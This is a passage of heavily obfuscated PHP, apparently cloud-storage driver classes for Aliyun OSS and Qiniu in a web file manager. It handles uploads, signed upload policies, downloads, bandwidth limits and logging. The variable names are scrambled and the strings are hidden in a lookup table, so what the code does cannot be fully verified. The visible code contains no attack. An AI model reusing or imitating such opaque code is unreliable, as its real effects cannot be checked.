$ûÉŠƒƒ, $ÛÆÍ˜§×); } catch (OSS\Core\OssException $¾§¢Ãà¬) { $this->writeLog(__FUNCTION__ . $¡Ç·×—ê[223] . $¾§¢Ãà¬->getMessage()); return !1; } $¡‹Ö = array($¡Ç·×—ê[1632] => trim($ÚşÀ™Áë[$¡Ç·×—ê[1629]], $¡Ç·×—ê[129]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¤°˜æ))); $this->updateObjMeta($¤°˜æ, $¡‹Ö); return isset($ÚşÀ™Áë[$¡Ç·×—ê[1639]][$¡Ç·×—ê[304]]) ? !0 : !1; } private function updateObjMeta($ù¿ƒÆ‚×, $ØªÄ·»Œ) { $ù¿ƒÆ‚× = $this->pathEncode($ù¿ƒÆ‚×); try { $„¬¢ë = array(OSS\OssClient::OSS_HEADERS => $ØªÄ·»Œ); $this->client->copyObject($this->bucket, $ù¿ƒÆ‚×, $this->bucket, $ù¿ƒÆ‚×, $„¬¢ë); } catch (OSS\Core\OssException $ôÌÛ¿Ÿ¥) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $ôÌÛ¿Ÿ¥->getMessage()); return !1; } return !0; } public function upload($—µüô¥, $Èğùå»Û, $É÷Ï’ë£ = false, $†ÈÕä¡ = REPEAT_REPLACE) { $¿üş›²ˆ =& $_SERVER[ŒÅŸ‹ä†]; $ÇÈà§ö… = trim($—µüô¥, $¿üş›²ˆ[8]); $İ’ôÓÍ‚ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¿üş›²ˆ[1632] => @md5_file($Èğùå»Û)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($—µüô¥))); $İ’ôÓÍ‚ = $this->trafficLimit($¿üş›²ˆ[1638], $İ’ôÓÍ‚); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÇÈà§ö…), $Èğùå»Û, $İ’ôÓÍ‚); } catch (OSS\Core\OssException $ç€†—©å) { $this->writeLog(__FUNCTION__ . $¿üş›²ˆ[223] . $ç€†—©å->getMessage()); return !1; } return $this->getPathOuter($—µüô¥); } public function getHost() { $¦ï¬»Ÿé =& $_SERVER[ŒÅŸ‹ä†]; $œ³é©æ = explode($¦ï¬»Ÿé[219], parent::getHost()); return $œ³é©æ[0] . $¦ï¬»Ÿé[219] . $this->bucket . $¦ï¬»Ÿé[10] . $œ³é©æ[1]; } public function uploadFormData($¶¯ò§Öß, $‰…îÎş‚ = 3600) { $ÔŒÎØ€· =& $_SERVER[ŒÅŸ‹ä†]; if (!($–îš‡Ë· = $this->getHost())) { return !1; } $×ú‚²ÈÈ = $‰…îÎş‚; $Áõò¸Àº = date($ÔŒÎØ€·[1640], time() + $×ú‚²ÈÈ); $éãÌ´Àµ = new DateTime($Áõò¸Àº); $¡ÍîÕ•ô = $éãÌ´Àµ->format(DateTime::ISO8601); $šÌğ‡Ü’ = strpos($¡ÍîÕ•ô, $ÔŒÎØ€·[381]); $¡ÍîÕ•ô = substr($¡ÍîÕ•ô, 0, $šÌğ‡Ü’) . $ÔŒÎØ€·[1641]; $Ï”Ü’¥Ë = 1048576000 * 5; $„ÂùÛò = $this->pathFather($¶¯ò§Öß); $œ¢ˆÙÒ = array($ÔŒÎØ€·[273] => $¡ÍîÕ•ô, $ÔŒÎØ€·[276] => array(array($ÔŒÎØ€·[1642], 0, $Ï”Ü’¥Ë), array($ÔŒÎØ€·[278], $ÔŒÎØ€·[279], $„ÂùÛò))); $¸ûõÎĞ– = base64_encode(json_encode($œ¢ˆÙÒ)); $’Æ÷ÉĞ = base64_encode(hash_hmac($ÔŒÎØ€·[1468], $¸ûõÎĞ–, $this->secret, !0)); $¦—ÃÛö = array($ÔŒÎØ€·[1643] => $this->accessKey, $ÔŒÎØ€·[288] => $¸ûõÎĞ–, $ÔŒÎØ€·[281] => $ÔŒÎØ€·[272], $ÔŒÎØ€·[1644] => $’Æ÷ÉĞ, $ÔŒÎØ€·[217] => $–îš‡Ë·); $¦—ÃÛö = $this->trafficLimit($ÔŒÎØ€·[1638], $¦—ÃÛö, !0); return $¦—ÃÛö; } public function uploadMultiData($Ö¢Àß‚ˆ, $Î‘ö•ÄÖ = 3600) { $°¼É¢‘¼ =& $_SERVER[ŒÅŸ‹ä†]; if (!($È¤™Œ Ø = $this->getHost())) { return !1; } $§â³öÒÌ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ö¢Àß‚ˆ)); return array($°¼É¢‘¼[292] => $§â³öÒÌ, $°¼É¢‘¼[217] => $È¤™Œ Ø . $°¼É¢‘¼[8] . $this->pathEncode($Ö¢Àß‚ˆ), $°¼É¢‘¼[293] => gmdate($°¼É¢‘¼[1645]), $°¼É¢‘¼[105] => $Ö¢Àß‚ˆ); } public function uploadMultiAuth($ÏØ‹Ìé™, $¹ñÓíÃ = array()) { if (isset($¹ñÓíÃ[$_SERVER[ŒÅŸ‹ä†][294]])) { return $this->uploadPartAuth($ÏØ‹Ìé™, $¹ñÓíÃ); } return $this->uploadListAuth($ÏØ‹Ìé™, $¹ñÓíÃ); } private function uploadPartAuth($Ä‹„æ½®, $î‹¾Æƒ‚ = array()) { $Ç¹ªÖ— =& $_SERVER[ŒÅŸ‹ä†]; $´ô·Å‡ = $î‹¾Æƒ‚[$Ç¹ªÖ—[105]]; $úİóéñ¥ = $this->_getUploadAuth($´ô·Å‡, $î‹¾Æƒ‚); $³µ‹ŞŸ‡ = array($Ç¹ªÖ—[296] => $úİóéñ¥[$Ç¹ªÖ—[296]], $Ç¹ªÖ—[293] => $úİóéñ¥[$Ç¹ªÖ—[293]]); if (isset($úİóéñ¥[$Ç¹ªÖ—[1646]])) { $³µ‹ŞŸ‡[$Ç¹ªÖ—[1646]] = $úİóéñ¥[$Ç¹ªÖ—[1646]]; } return $³µ‹ŞŸ‡; } private function uploadListAuth($Û€ü•å, $ˆ‡º‘° = array()) { $½••±‰· =& $_SERVER[ŒÅŸ‹ä†]; $ÓŠ’š¾å = $ˆ‡º‘°[$½••±‰·[105]]; $Ì×€¯à¶ = $ˆ‡º‘°[$½••±‰·[292]]; $òğÏƒ¾— = $this->client->listParts($this->bucket, $this->pathEncode($ÓŠ’š¾å), $Ì×€¯à¶); $’ØßõŠˆ = $òğÏƒ¾—->getListPart(); $³ñØ”÷ = array(); foreach ($’ØßõŠˆ as $éÔó¬Ç) { $³ñØ”÷[] = array($½••±‰·[307] => $éÔó¬Ç->getPartNumber(), $½••±‰·[308] => trim($éÔó¬Ç->getETag(), $½••±‰·[129])); } if (!$³ñØ”÷) { return !1; } $ò¨•¹í¶ = $this->_getUploadAuth($ÓŠ’š¾å, $ˆ‡º‘°); return array($½••±‰·[296] => $ò¨•¹í¶[$½••±‰·[296]], $½••±‰·[293] => $ò¨•¹í¶[$½••±‰·[293]], $½••±‰·[299] => $³ñØ”÷); } private function _getUploadAuth($ÒĞÆà¢, $±àŞ¥ªí) { $ëïÖù² =& $_SERVER[ŒÅŸ‹ä†]; $Ëœ™ıäÅ = gmdate($ëïÖù²[1645]); $·Ô³¼Æ¤ = isset($±àŞ¥ªí[$ëïÖù²[294]]) ? $ëïÖù²[264] : $ëïÖù²[298]; $¢õÕµ‰» = array_intersect_key($±àŞ¥ªí, array_flip(array($ëïÖù²[294], $ëïÖù²[292]))); ksort($¢õÕµ‰»); $¶ŸâÚ¬› = $¢õÕµ‰» ? $ëïÖù²[86] . http_build_query($¢õÕµ‰», null, $ëïÖù²[295], PHP_QUERY_RFC3986) : $ëïÖù²[12]; $Ğ‰Ú¬ù« = array($·Ô³¼Æ¤, $ëïÖù²[12], $ëïÖù²[131], $Ëœ™ıäÅ, "\170\55\x6f\163\163\55\144\141\164\x65\x3a{$Ëœ™ıäÅ}", $ëïÖù²[8] . $this->bucket . $ëïÖù²[8] . $ÒĞÆà¢ . $¶ŸâÚ¬›); if (isset($±àŞ¥ªí[$ëïÖù²[294]])) { $—¢ê¨Ìõ = $this->trafficLimit($ëïÖù²[1638], array(), !0); if ($—¢ê¨Ìõ) { $ÒĞÆà¢ = $ëïÖù²[1646]; array_splice($Ğ‰Ú¬ù«, 5, 0, $ÒĞÆà¢ . $ëïÖù²[4] . $—¢ê¨Ìõ[$ÒĞÆà¢]); } } $Áåìõ§ù = implode($ëïÖù²[18], $Ğ‰Ú¬ù«); $Äô˜ÂÃŒ = base64_encode(hash_hmac($ëïÖù²[1468], $Áåìõ§ù, $this->secret, !0)); $ú§ƒ››û = $ëïÖù²[1615] . $this->accessKey . $ëïÖù²[4] . $Äô˜ÂÃŒ; $“—‡èÁÔ = array($ëïÖù²[296] => $ú§ƒ››û, $ëïÖù²[293] => $Ëœ™ıäÅ); if (!empty($—¢ê¨Ìõ)) { $“—‡èÁÔ = array_merge($“—‡èÁÔ, $—¢ê¨Ìõ); } return $“—‡èÁÔ; } public function download($÷¥‘”•¡, $©äË½ıä) { $›ïßÑ§¼ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isFolder($÷¥‘”•¡)) { return !1; } try { $®·ÑöÖ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $©äË½ıä); $®·ÑöÖ = $this->trafficLimit($›ïßÑ§¼[120], $®·ÑöÖ); $this->client->getObject($this->bucket, $this->pathEncode($÷¥‘”•¡), $®·ÑöÖ); } catch (OSS\Core\OssException $œúË–š¯) { $this->writeLog(__FUNCTION__ . $›ïßÑ§¼[223] . $œúË–š¯->getMessage()); return !1; } return $©äË½ıä; } public function fileSubstr($ª©Ô™‘ß, $ôä‡³ğö = 0, $„œÏ›Ø« = false) { if ($ôä‡³ğö === -1) { $ÍÓè† = array(); } else { if ($„œÏ›Ø« === !1) { $ÃØ ô = $this->size($ª©Ô™‘ß); } else { $ÃØ ô = $ôä‡³ğö + $„œÏ›Ø« - 1; } $ÍÓè† = array(OSS\OssClient::OSS_RANGE => "{$ôä‡³ğö}\x2d{$ÃØ ô}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ª©Ô™‘ß), $ÍÓè†); } catch (OSS\Core\OssException $„ø¥‡áó) { $this->writeLog(__FUNCTION__ . $_SERVER[ŒÅŸ‹ä†][223] . $„ø¥‡áó->getMessage()); think_exception($„ø¥‡áó->getMessage()); return !1; } } private function trafficLimit($™ëÛÍí , $Æ²ƒÊ¥† = array(), $µÜıºæÄ = false) { $îêìÍÚï =& $_SERVER[ŒÅŸ‹ä†]; if ($™ëÛÍí  == $îêìÍÚï[1638] && $this->isUploadServer() || $™ëÛÍí  == $îêìÍÚï[120] && $this->isFileOutServer()) { return $Æ²ƒÊ¥†; } $Ùê«ÍÎ = floatval($GLOBALS[$îêìÍÚï[6]][$îêìÍÚï[102]][$îêìÍÚï[118]][$™ëÛÍí ]) * 1024 * 1024 * 8; if (!$Ùê«ÍÎ) { return $Æ²ƒÊ¥†; } $Ùê«ÍÎ = $Ùê«ÍÎ < 819200 ? 819200 : ($Ùê«ÍÎ > 838860800 ? 838860800 : $Ùê«ÍÎ); if ($µÜıºæÄ) { $Æ²ƒÊ¥†[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ùê«ÍÎ); } else { if (!isset($Æ²ƒÊ¥†[OSS\OssClient::OSS_HEADERS])) { $Æ²ƒÊ¥†[OSS\OssClient::OSS_HEADERS] = array(); } $Æ²ƒÊ¥†[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ùê«ÍÎ); } return $Æ²ƒÊ¥†; } public function link($ä»’¦Ü, $Òé²’ Ù = array()) { $ÚŞ¦€ß” =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->exist($ä»’¦Ü) || $this->isFolder($ä»’¦Ü)) { return !1; } try { $Òé²’ Ù = $this->trafficLimit($ÚŞ¦€ß”[120], $Òé²’ Ù, !0); $™‡°©—í = $this->client->signUrl($this->bucket, $this->pathEncode($ä»’¦Ü), 3600 * 12, $ÚŞ¦€ß”[1550], $Òé²’ Ù); return $this->getCdnLink($™‡°©—í); } catch (OSS\Core\OssException $”†ã÷°œ) { $this->writeLog(__FUNCTION__ . $ÚŞ¦€ß”[223] . $”†ã÷°œ->getMessage()); return !1; } } public function fileOut($€„€ñ, $“§ò¶ = false, $Å—À©Í‚ = false, $ÙÃ³´•ƒ = '') { $‘—şªĞ¦ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isFileOutServer()) { return $this->fileOutServer($€„€ñ, $“§ò¶, $Å—À©Í‚, $ÙÃ³´•ƒ); } if (!$Å—À©Í‚) { $Å—À©Í‚ = $this->pathThis($€„€ñ); } $Å—À©Í‚ = rawurlencode($Å—À©Í‚); $«Â‚˜üŸ = get_file_mime(get_path_ext($Å—À©Í‚)); if ($«Â‚˜üŸ == $‘—şªĞ¦[259]) { return parent::fileOut($€„€ñ, $“§ò¶, $Å—À©Í‚, $ÙÃ³´•ƒ); } $“§ò¶ = $“§ò¶ ? $‘—şªĞ¦[1647] : $‘—şªĞ¦[1648]; $ü¨ºÅÎ· = array(OSS\OssClient::OSS_SUB_RESOURCE => $‘—şªĞ¦[1649] . rawurlencode("{$“§ò¶}\x3b\146\151\154\145\156\141\155\145\x3d{$Å—À©Í‚}")); $ôˆÕôóš = $this->link($€„€ñ, $ü¨ºÅÎ·); $this->fileOutLink($ôˆÕôóš); } public function fileOutServer($Ê—§ˆß, $²¬“Æ = false, $±ı´©ÙĞ = false, $§Â¿£ãì = '') { parent::fileOut($Ê—§ˆß, $²¬“Æ, $±ı´©ÙĞ, $§Â¿£ãì); } public function fileOutImage($ä¶öÍÙ³, $šÅğ¦‹’ = 250) { if ($this->size($ä¶öÍÙ³) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ä¶öÍÙ³, $šÅğ¦‹’); } $Æ±ÂóÇ¯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ŒÅŸ‹ä†][1612] . $šÅğ¦‹’); $¾èœã± = $this->link($ä¶öÍÙ³, $Æ±ÂóÇ¯); $this->fileOutLink($¾èœã±); } public function fileOutImageServer($ñ§Àª–², $ˆßœÌ¶­ = 250) { parent::fileOutImage($ñ§Àª–², $ˆßœÌ¶­); } public function fileOutLink($Í¶»±‰) { $÷Ò–Ì¢ =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->isCdnHost() && substr($Í¶»±‰, 0, 7) == $÷Ò–Ì¢[227]) { $Í¶»±‰ = $÷Ò–Ì¢[228] . substr($Í¶»±‰, 7); } header($÷Ò–Ì¢[183] . $Í¶»±‰); die; } public function hashMd5($Ş€Ñ·çë, $’ı†ëì = '') { $ÀƒÏÏÛâ =& $_SERVER[ŒÅŸ‹ä†]; $ˆÆµĞ› = $this->_objectMeta($Ş€Ñ·çë); if (!$ˆÆµĞ›) { return $ÀƒÏÏÛâ[12]; } if (!isset($ˆÆµĞ›[$ÀƒÏÏÛâ[1632]]) && !empty($’ı†ëì)) { $ÇÉ‡Ù¶Â = $this->updateObjMeta($Ş€Ñ·çë, array($ÀƒÏÏÛâ[1632] => $’ı†ëì)); $ˆÆµĞ›[$ÀƒÏÏÛâ[1632]] = $ÇÉ‡Ù¶Â ? $’ı†ëì : $ÀƒÏÏÛâ[12]; } return isset($ˆÆµĞ›[$ÀƒÏÏÛâ[1632]]) ? strtolower($ˆÆµĞ›[$ÀƒÏÏÛâ[1632]]) : $ÀƒÏÏÛâ[12]; } public function size($¯Š‡ö²×) { $àÛĞ«ôİ = $this->objectMeta($¯Š‡ö²×); return $àÛĞ«ôİ ? $àÛĞ«ôİ[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function info($Ã­Ù) { if ($this->isFolder($Ã­Ù)) { return $this->folderInfo($Ã­Ù); } else { if ($this->isFile($Ã­Ù)) { return $this->fileInfo($Ã­Ù); } } return !1; } public function exist($§úë²©„) { return $this->isFile($§úë²©„) || $this->isFolder($§úë²©„); } public function isFile($Ğı·é§) { return !$this->isFolder($Ğı·é§) && $this->objectMeta($Ğı·é§); } public function isFolder($îÜşúäâ) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][188], $îÜşúäâ); } protected function objectMeta($—¬¯ Á) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][190], $—¬¯ Á); } protected function _objectMeta($ı¢“İ¦ô) { $˜³ÕÜ© =& $_SERVER[ŒÅŸ‹ä†]; try { $·³ ‡ã´ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ı¢“İ¦ô)); } catch (OSS\Core\OssException $¹ª¬Ù¬¢) { $this->writeLog(__FUNCTION__ . $˜³ÕÜ©[223] . $¹ª¬Ù¬¢->getMessage()); $·³ ‡ã´ = !1; } if ($·³ ‡ã´) { $·³ ‡ã´[$˜³ÕÜ©[89]] = intval($·³ ‡ã´[$˜³ÕÜ©[1630]]); } return $·³ ‡ã´; } protected function _isFolder($×‘•¬¸ö) { $•ì¹òÀ =& $_SERVER[ŒÅŸ‹ä†]; if ($×‘•¬¸ö == $•ì¹òÀ[12] || $×‘•¬¸ö == $•ì¹òÀ[8]) { return !0; } $¤û£¿Ãµ = array($•ì¹òÀ[1625] => $•ì¹òÀ[8], $•ì¹òÀ[1626] => rtrim($×‘•¬¸ö, $•ì¹òÀ[8]) . $•ì¹òÀ[8], $•ì¹òÀ[1627] => 1, $•ì¹òÀ[1628] => $•ì¹òÀ[12]); $›“¾­Ë = $this->client->listObjects($this->bucket, $¤û£¿Ãµ); if ($›“¾­Ë->getObjectList() || $›“¾­Ë->getPrefixList()) { return !0; } return !1; } public function writeLog($ŸĞÕ­ = '', $·ÌŠƒ‰¾ = false) { $ı³ÍÒ‹Ÿ =& $_SERVER[ŒÅŸ‹ä†]; $¢–ßŞ¹È = in_array(ACTION, array($ı³ÍÒ‹Ÿ[221], $ı³ÍÒ‹Ÿ[222])); if (!$¢–ßŞ¹È && !GLOBAL_DEBUG) { return; } $ø†æë²¿ = 0; if (stripos($ŸĞÕ­, $ı³ÍÒ‹Ÿ[1650]) !== !1) { $ø†æë²¿ = 1; $ó¶šŠÏ = explode($ı³ÍÒ‹Ÿ[1651], $ŸĞÕ­); $ŸĞÕ­ = !empty($ó¶šŠÏ[1]) ? $ó¶šŠÏ[1] : $ŸĞÕ­; } else { if (stripos($ŸĞÕ­, $ı³ÍÒ‹Ÿ[1652])) { $ø†æë²¿ = 2; $ó¶šŠÏ = explode($ı³ÍÒ‹Ÿ[1652], $ŸĞÕ­); $ó¶šŠÏ = explode($ı³ÍÒ‹Ÿ[4], $ó¶šŠÏ[0]); $ŸĞÕ­ = !empty($ó¶šŠÏ[1]) ? $ó¶šŠÏ[1] : $ŸĞÕ­; } } if ($¢–ßŞ¹È && I18n::getType() == $ı³ÍÒ‹Ÿ[1653]) { if ($ø†æë²¿ == 1) { $ŸĞÕ­ = str_replace($ı³ÍÒ‹Ÿ[1654], $ı³ÍÒ‹Ÿ[1655], $ŸĞÕ­); } else { if ($ø†æë²¿ == 2) { $ó¶šŠÏ = explode($ı³ÍÒ‹Ÿ[223], $ó¶šŠÏ[0]); $¸ö¹ŸÀ° = isset($ó¶šŠÏ[1]) ? $ó¶šŠÏ[1] : $ı³ÍÒ‹Ÿ[12]; $±ØŞâ× = array($ı³ÍÒ‹Ÿ[1656] => $ı³ÍÒ‹Ÿ[1657], $ı³ÍÒ‹Ÿ[1658] => $ı³ÍÒ‹Ÿ[1659], $ı³ÍÒ‹Ÿ[1660] => $ı³ÍÒ‹Ÿ[1661], $ı³ÍÒ‹Ÿ[1662] => $ı³ÍÒ‹Ÿ[1663], $ı³ÍÒ‹Ÿ[1664] => $ı³ÍÒ‹Ÿ[1665], $ı³ÍÒ‹Ÿ[1666] => $ı³ÍÒ‹Ÿ[1667], $ı³ÍÒ‹Ÿ[1668] => $ı³ÍÒ‹Ÿ[1669], $ı³ÍÒ‹Ÿ[1670] => $ı³ÍÒ‹Ÿ[1671], $ı³ÍÒ‹Ÿ[1672] => $ı³ÍÒ‹Ÿ[1673], $ı³ÍÒ‹Ÿ[1674] => $ı³ÍÒ‹Ÿ[1675]); if (isset($±ØŞâ×[$¸ö¹ŸÀ°])) { $ŸĞÕ­ = $±ØŞâ×[$¸ö¹ŸÀ°]; } } } if (stripos($ŸĞÕ­, $ı³ÍÒ‹Ÿ[1676])) { $ŸĞÕ­ = $ı³ÍÒ‹Ÿ[1677]; } } if (!trim($ŸĞÕ­)) { return; } parent::writeLog(trim($ŸĞÕ­), $·ÌŠƒ‰¾); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($áè‘¨şú) { parent::__construct(); require_once SDK_DIR . $_SERVER[ŒÅŸ‹ä†][1678]; $this->_init($áè‘¨şú); } public function _init($ÜòŞÛÖè) { $‚ç‡¨ò¦ =& $_SERVER[ŒÅŸ‹ä†]; $this->config = $ÜòŞÛÖè; foreach ($ÜòŞÛÖè as $ÅÈ×ƒù => $™â®‰¾¶) { if (isset($this->{$ÅÈ×ƒù})) { $this->{$ÅÈ×ƒù} = $™â®‰¾¶; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‚ç‡¨ò¦[1679] . LNG($‚ç‡¨ò¦[1616])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($òµ•Ö, $Ã‰Ã¥ÁÛ = '', $‡¾ù—šº = REPEAT_RENAME) { if ($this->setContent($òµ•Ö, $Ã‰Ã¥ÁÛ)) { return $this->getPathOuter($òµ•Ö); } return !1; } public function mkdir($´ÃÅ˜µª, $Ø´®÷õµ = REPEAT_SKIP) { $÷‘ÁÑÌ =& $_SERVER[ŒÅŸ‹ä†]; $˜ëá„ Ü = trim($´ÃÅ˜µª, $÷‘ÁÑÌ[8]); if ($this->_isFolder($˜ëá„ Ü)) { return $this->getPathOuter($˜ëá„ Ü); } $´ÃÅ˜µª = $˜ëá„ Ü . $÷‘ÁÑÌ[8]; $¬— ¯¹ƒ = get_path_this($˜ëá„ Ü); $ˆñœ‘£ = $´ÃÅ˜µª . $¬— ¯¹ƒ; if (!$this->mkfile($ˆñœ‘£)) { return !1; } if (!$this->moveFile($ˆñœ‘£, $´ÃÅ˜µª)) { $this->delFile($ˆñœ‘£); return !1; } return $this->getPathOuter($˜ëá„ Ü); } public function copyFile($Ã§Ãìâ, $›±ƒ‘…™) { $Ì…âëÂ£ = $this->bucketManager->copy($this->bucket, $Ã§Ãìâ, $this->bucket, $›±ƒ‘…™, !0); return $Ì…âëÂ£ ? !1 : $this->getPathOuter($›±ƒ‘…™); } public function moveFile($² ¸¼È, $Ú‘À‰¦) { $—¶Î‰ìÁ = $this->bucketManager->move($this->bucket, $² ¸¼È, $this->bucket, $Ú‘À‰¦, !0); return $—¶Î‰ìÁ ? !1 : $this->getPathOuter($Ú‘À‰¦); } public function delFile($·ú›˜³å) { if (!$this->exist($·ú›˜³å)) { return !0; } $áÍĞ×¡¦ = $this->bucketManager->delete($this->bucket, $·ú›˜³å); if (!$áÍĞ×¡¦) { return !0; } return $áÍĞ×¡¦->code() == 612 ? !0 : !1; } public function delFolder($à‘ôÁÚå) { $¦Ğé›™« =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->exist($à‘ôÁÚå)) { return !0; } $this->listItemCache = !1; $—¦Œ•¿Å = $this->fileList($à‘ôÁÚå); $this->listItemCache = !0; $úÒ¯ø»Ö = trim($à‘ôÁÚå, $¦Ğé›™«[8]) . $¦Ğé›™«[8]; if (!empty($à‘ôÁÚå) && $à‘ôÁÚå !== $¦Ğé›™«[239] && !in_array($úÒ¯ø»Ö, $—¦Œ•¿Å[$¦Ğé›™«[95]])) { $—¦Œ•¿Å[$¦Ğé›™«[95]][] = $úÒ¯ø»Ö; } $ÌƒÓ¦¢ï = $this->delByBatch($—¦Œ•¿Å[$¦Ğé›™«[96]]); if (!$ÌƒÓ¦¢ï) { return !1; } $ÌƒÓ¦¢ï = $this->delByBatch($—¦Œ•¿Å[$¦Ğé›™«[95]]); if (!$ÌƒÓ¦¢ï) { return !1; } return $this->delFile($úÒ¯ø»Ö); } private function delByBatch($İóß¹×) { foreach (array_chunk($İóß¹×, 1000) as $ª¤‰ÈòÜ) { $Ä˜û¢ø© = $this->bucketManager->buildBatchDelete($this->bucket, $ª¤‰ÈòÜ); list($“î¼»Ôú, $î©‹Œ¤) = $this->bucketManager->batch($Ä˜û¢ø©); if ($î©‹Œ¤) { return !1; } } return !0; } public function rename($ÈÙ¨Çª, $²Å¯®ŞÃ) { return $this->renameObject($ÈÙ¨Çª, $²Å¯®ŞÃ); } public function fileInfo($õ¯ˆ®®é, $Àõçõ¢ = false, $ãÙéóÜ = array()) { $âå×Çòü =& $_SERVER[ŒÅŸ‹ä†]; $”ÃÙ×şã = array($âå×Çòü[42] => $this->pathThis($õ¯ˆ®®é), $âå×Çòü[97] => $this->getPathOuter($âå×Çòü[8] . $õ¯ˆ®®é), $âå×Çòü[43] => $âå×Çòü[241], $âå×Çòü[89] => isset($ãÙéóÜ[$âå×Çòü[1680]]) ? $ãÙéóÜ[$âå×Çòü[1680]] : 0, $âå×Çòü[177] => $this->ext($õ¯ˆ®®é)); if ($Àõçõ¢) { return $”ÃÙ×şã; } $”ÃÙ×şã[$âå×Çòü[242]] = $”ÃÙ×şã[$âå×Çòü[98]] = 0; $”ÃÙ×şã[$âå×Çòü[243]] = $”ÃÙ×şã[$âå×Çòü[244]] = !0; if (empty($ãÙéóÜ)) { $ãÙéóÜ = $this->objectMeta($õ¯ˆ®®é); if (!$ãÙéóÜ) { return $”ÃÙ×şã; } } if (isset($ãÙéóÜ[$âå×Çòü[245]]) && $ãÙéóÜ[$âå×Çòü[245]]) { $”ÃÙ×şã[$âå×Çòü[246]] = $ãÙéóÜ[$âå×Çòü[245]]; } if (isset($ãÙéóÜ[$âå×Çòü[256]]) && $ãÙéóÜ[$âå×Çòü[256]]) { $”ÃÙ×şã[$âå×Çòü[246]] = $ãÙéóÜ[$âå×Çòü[256]]; } if (isset($ãÙéóÜ[$âå×Çòü[1681]])) { $”ÃÙ×şã[$âå×Çòü[98]] = substr($ãÙéóÜ[$âå×Çòü[1681]] . $âå×Çòü[12], 0, 10); } if (isset($ãÙéóÜ[$âå×Çòü[1680]])) { $”ÃÙ×şã[$âå×Çòü[89]] = $ãÙéóÜ[$âå×Çòü[1680]]; } return $”ÃÙ×şã; } public function folderInfo($Æ‚ë•¦‘, $‡ÛÇëÊ„ = false) { $çŸ·òİ =& $_SERVER[ŒÅŸ‹ä†]; $ê¦ˆ¥Íè = array($çŸ·òİ[42] => $this->pathThis($Æ‚ë•¦‘), $çŸ·òİ[97] => $this->getPathOuter($çŸ·òİ[8] . $Æ‚ë•¦‘), $çŸ·òİ[43] => $çŸ·òİ[88]); if ($‡ÛÇëÊ„) { return $ê¦ˆ¥Íè; } $ê¦ˆ¥Íè[$çŸ·òİ[242]] = $ê¦ˆ¥Íè[$çŸ·òİ[98]] = 0; $ê¦ˆ¥Íè[$çŸ·òİ[243]] = $ê¦ˆ¥Íè[$çŸ·òİ[244]] = !0; $Æ‚ë•¦‘ = rtrim($Æ‚ë•¦‘, $çŸ·òİ[8]) . $çŸ·òİ[8]; $¥óö¼Àê = $this->objectMeta($Æ‚ë•¦‘); if (isset($¥óö¼Àê[$çŸ·òİ[1681]])) { $ê¦ˆ¥Íè[$çŸ·òİ[98]] = substr($¥óö¼Àê[$çŸ·òİ[1681]] . $çŸ·òİ[12], 0, 10); } return $ê¦ˆ¥Íè; } public function listPath($øÂëâû, $ËĞÚ£İ÷ = false) { $é€˜Š™¼ =& $_SERVER[ŒÅŸ‹ä†]; $±ÛøŠ›Á = $this->fileList($øÂëâû, $é€˜Š™¼[8], !0); foreach ($±ÛøŠ›Á[$é€˜Š™¼[95]] as $´ÅÏØ => $¢æÌ£–Â) { $±ÛøŠ›Á[$é€˜Š™¼[95]][$´ÅÏØ] = $this->folderInfo($¢æÌ£–Â, $ËĞÚ£İ÷); } foreach ($±ÛøŠ›Á[$é€˜Š™¼[96]] as $´ÅÏØ => $¢æÌ£–Â) { $±ÛøŠ›Á[$é€˜Š™¼[96]][$´ÅÏØ] = $this->fileInfo($¢æÌ£–Â[$é€˜Š™¼[42]], $ËĞÚ£İ÷, $¢æÌ£–Â); } return $±ÛøŠ›Á; } public function has($ü››•÷Í, $¢ş°ùê = false, $úãêÍ™† = true) { $À—æøã =& $_SERVER[ŒÅŸ‹ä†]; $ü››•÷Í = trim($ü››•÷Í, $À—æøã[8]); $•¯´¯óå = empty($ü››•÷Í) && $ü››•÷Í !== $À—æøã[239] ? $À—æøã[12] : $ü››•÷Í . $À—æøã[8]; $³Íİõ®ù = $À—æøã[12]; $Ş´‹—ø = 500; $æ×üß = $À—æøã[8]; $—›Ù¬éÌ = $¡ô¸à³ = 0; while (!0) { check_abort(); list($éÂÆÑÔ, $‰ÛµÕÁ) = $this->bucketManager->listFiles($this->bucket, $•¯´¯óå, $³Íİõ®ù, $Ş´‹—ø, $æ×üß); if ($‰ÛµÕÁ) { break; } $³Íİõ®ù = array_key_exists($À—æøã[1628], $éÂÆÑÔ) ? $³Íİõ®ù = $éÂÆÑÔ[$À—æøã[1682]] : $À—æøã[12]; if ($¢ş°ùê) 